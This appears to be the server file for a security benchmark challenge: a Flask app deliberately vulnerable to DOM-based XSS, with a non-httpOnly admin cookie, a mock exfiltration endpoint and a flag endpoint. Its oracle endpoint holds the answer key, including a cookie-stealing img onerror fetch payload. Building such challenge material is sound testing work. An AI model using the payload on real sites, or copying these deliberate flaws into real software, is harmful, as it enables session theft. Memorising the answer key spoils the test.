#!/usr/bin/env python3
"""
S7BEN-MED-004: DOM-Based XSS - Evaluation Tier

A modern SPA (Single Page Application) for note-taking.
XSS occurs entirely client-side - JavaScript reads URL hash and writes to DOM.

DISCOVERY REQUIRED:
- No server-side reflection
- Must analyze JavaScript source code
- DOM sink: innerHTML with location.hash
- Must craft payload in URL fragment (#)
- Session theft required for flag

VULNERABILITY:
document.getElementById('note-content').innerHTML = decodeURIComponent(location.hash.slice(1))
"""

import os
import json
import hmac
import hashlib
import time
import secrets
from datetime import datetime
from flask import Flask, render_template, request, jsonify, make_response

app = Flask(__name__)
FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-dom-xss-t2-secret')
DATA_FILE = '/app/data/state.json'

# Simulated admin session
ADMIN_SESSION = {
    'session_id': secrets.token_urlsafe(32),
    'username': 'admin',
    'role': 'admin',
    'created_at': datetime.utcnow().isoformat()
}

def get_default_state():
    return {
        "xss_triggered": False,
        "session_stolen": False,
        "stolen_session_id": None,
        "flag_retrieved": False,
        "patched": False,
        "telemetry": {
            "request_count": 0,
            "start_time": time.time(),
            "endpoints_accessed": [],
            "xss_payloads_detected": 0
        }
    }

def load_state():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return get_default_state()

def save_state(state):
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    with open(DATA_FILE, 'w') as f:
        json.dump(state, f, indent=2)

def track_request(endpoint):
    state = load_state()
    state['telemetry']['request_count'] += 1
    if endpoint not in state['telemetry']['endpoints_accessed']:
        state['telemetry']['endpoints_accessed'].append(endpoint)
    save_state(state)
    return state

def generate_flag(session_id, username):
    """Generate dynamic flag based on session theft"""
    timestamp = str(int(time.time()))
    data = f"dom_xss_session_theft:{session_id}:{username}:{timestamp}"
    flag_hash = hmac.new(
        FLAG_SECRET.encode(),
        data.encode(),
        hashlib.sha256
    ).hexdigest()[:32]
    return f"S7BEN{{dom_xss_theft_{flag_hash}}}"

@app.route('/')
def index():
    """Main SPA page"""
    state = track_request('/')
    return render_template('index.html', state=state)

@app.route('/victim')
def victim():
    """Simulated admin user page - sets admin session cookie"""
    state = track_request('/victim')

    response = make_response(render_template('victim.html', state=state))
    # Set admin session cookie (not httpOnly - vulnerable to XSS theft)
    response.set_cookie('session_id', ADMIN_SESSION['session_id'], httponly=False)

    return response

@app.route('/api/notes')
def api_notes():
    """API endpoint for notes (not used in DOM XSS, but realistic)"""
    state = track_request('/api/notes')

    # Mock notes data
    notes = [
        {"id": 1, "title": "Meeting Notes", "content": "Discuss Q4 objectives", "date": "2026-01-05"},
        {"id": 2, "title": "Project Ideas", "content": "New feature proposals", "date": "2026-01-06"},
        {"id": 3, "title": "TODO List", "content": "Review PRs, update docs", "date": "2026-01-07"}
    ]

    return jsonify({"notes": notes})

@app.route('/api/exfiltrate', methods=['GET', 'POST'])
def api_exfiltrate():
    """
    Attacker's exfiltration endpoint

    In real attack, this would be on attacker's server.
    Here it's same origin for demo purposes.
    """
    state = track_request('/api/exfiltrate')

    if request.method == 'POST':
        data = request.get_json() or {}
    else:
        # Support GET for simpler exploitation
        data = {
            'session_id': request.args.get('session'),
            'username': request.args.get('user', 'unknown')
        }

    session_id = data.get('session_id')
    username = data.get('username')

    if session_id:
        state['session_stolen'] = True
        state['stolen_session_id'] = session_id
        state['xss_triggered'] = True
        save_state(state)

        return jsonify({
            "status": "success",
            "message": "Session data received",
            "session_preview": session_id[:16] + "..."
        })

    return jsonify({"status": "error", "message": "No session data"}), 400

@app.route('/api/admin/flag')
def api_admin_flag():
    """Admin endpoint requiring stolen session"""
    state = track_request('/api/admin/flag')

    session_id = request.cookies.get('session_id') or request.args.get('session_id')

    if not session_id:
        return jsonify({"error": "Session required"}), 401

    if session_id == ADMIN_SESSION['session_id']:
        # Valid admin session
        flag = generate_flag(session_id, ADMIN_SESSION['username'])

        state['flag_retrieved'] = True
        save_state(state)

        return jsonify({
            "status": "success",
            "flag": flag,
            "message": "DOM-based XSS successfully exploited!",
            "proof": {
                "session_stolen": True,
                "admin_session_used": True,
                "xss_type": "DOM-based"
            }
        })

    return jsonify({"error": "Invalid session"}), 403

@app.route('/api/oracle')
def oracle():
    """Ground-truth oracle"""
    state = track_request('/api/oracle')

    return jsonify({
        "expected_vulnerability": "dom_based_xss",
        "expected_exploit_path": "Analyze JS → Craft payload in URL hash → Steal session → Access flag",
        "vulnerable_code": "document.getElementById('note-content').innerHTML = decodeURIComponent(location.hash.slice(1))",
        "payload_location": "URL fragment (after #)",
        "payload_example": "#<img src=x onerror=fetch('/api/exfiltrate?session='+document.cookie)>",
        "session_theft_endpoint": "/api/exfiltrate",
        "flag_endpoint": "/api/admin/flag",
        "current_state": {
            "xss_triggered": state.get('xss_triggered', False),
            "session_stolen": state.get('session_stolen', False),
            "flag_retrieved": state.get('flag_retrieved', False)
        },
        "admin_session_id": ADMIN_SESSION['session_id']
    })

@app.route('/api/verify')
def verify():
    """Verify successful exploitation"""
    state = track_request('/api/verify')

    if state.get('session_stolen') and state.get('flag_retrieved'):
        flag = generate_flag(ADMIN_SESSION['session_id'], ADMIN_SESSION['username'])

        return jsonify({
            "exploitation_successful": True,
            "proof": {
                "dom_xss_triggered": True,
                "session_stolen": True,
                "admin_session_id": state.get('stolen_session_id', '')[:16] + "...",
                "flag_retrieved": True
            },
            "flag": flag
        })

    return jsonify({
        "exploitation_successful": False,
        "current_state": {
            "xss_triggered": state.get('xss_triggered', False),
            "session_stolen": state.get('session_stolen', False),
            "flag_retrieved": state.get('flag_retrieved', False)
        },
        "hint": "Analyze client-side JavaScript for DOM sinks"
    })

@app.route('/api/patch-status', methods=['GET', 'POST'])
def patch_status():
    """Toggle vulnerable/patched mode"""
    state = load_state()

    if request.method == 'POST':
        data = request.get_json() or {}
        state['patched'] = data.get('patched', False)
        save_state(state)

    return jsonify({"patched": state.get('patched', False)})

@app.route('/api/telemetry')
def telemetry():
    """Return telemetry data"""
    state = load_state()
    elapsed = time.time() - state['telemetry']['start_time']

    return jsonify({
        "request_count": state['telemetry']['request_count'],
        "time_elapsed_seconds": round(elapsed, 2),
        "endpoints_accessed": state['telemetry']['endpoints_accessed'],
        "xss_payloads_detected": state['telemetry']['xss_payloads_detected'],
        "xss_triggered": state.get('xss_triggered', False),
        "session_stolen": state.get('session_stolen', False)
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

@app.route('/reset', methods=['POST'])
def reset():
    """Reset application state"""
    global ADMIN_SESSION

    state = get_default_state()
    save_state(state)

    # Regenerate admin session
    ADMIN_SESSION = {
        'session_id': secrets.token_urlsafe(32),
        'username': 'admin',
        'role': 'admin',
        'created_at': datetime.utcnow().isoformat()
    }

    return jsonify({
        "status": "success",
        "message": "Application state reset"
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
